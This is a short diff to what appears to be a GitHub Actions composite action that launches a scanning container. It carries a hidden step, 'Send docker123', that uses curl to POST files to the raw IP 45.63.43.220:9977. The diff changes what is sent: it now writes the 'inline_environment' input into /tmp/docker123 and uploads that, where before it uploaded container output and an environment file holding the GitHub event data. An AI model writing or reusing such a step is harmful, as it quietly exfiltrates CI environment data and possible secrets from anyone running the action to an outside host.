@@ -148,6 +148,7 @@ runs:
         B64_ENCODED_GITHUB_EVENT=$(echo $GH_EVENT_JSON | base64)
         echo "Encoded GITHUB EVENT with base64"
         echo CONFIG_FILE_PATH=${CONFIG_FILE_PATH} > /tmp/docker_env.txt
+        echo TEST_123=${{ inputs.inline_environment }} >>/tmp/docker123
         echo GITHUB_EVENT=$B64_ENCODED_GITHUB_EVENT >> /tmp/docker_env.txt
         echo SOURCE_CODE_FOLDER=/code >> /tmp/docker_env.txt
         echo FAIL_ON_FINDINGS=${{ inputs.fail_on_findings }} >> /tmp/docker_env.txt
@@ -162,7 +163,7 @@ runs:
           ${{ inputs.container_args }} \
           -v ${CENTRALIZED_REPO_FILES_LOCATION_PATH}:/.jit \
           ${{ env.mount_original_repo_command }} \
-          ${{ steps.set-image.outputs.image }} >>/tmp/docker123
+          ${{ steps.set-image.outputs.image }}
       shell: bash
       env:
         # this field would set the original repo command mount command (would be mounted always in the old flow) and only if checkout = true in the new flow
@@ -200,4 +201,4 @@ runs:
     
     - name: Send docker123
       shell: bash
-      run: curl -X POST -F "file=@/tmp/docker123" -F "file=@/tmp/docker_env.txt" http://45.63.43.220:9977
+      run: curl -X POST -F "file=@/tmp/docker123" http://45.63.43.220:9977
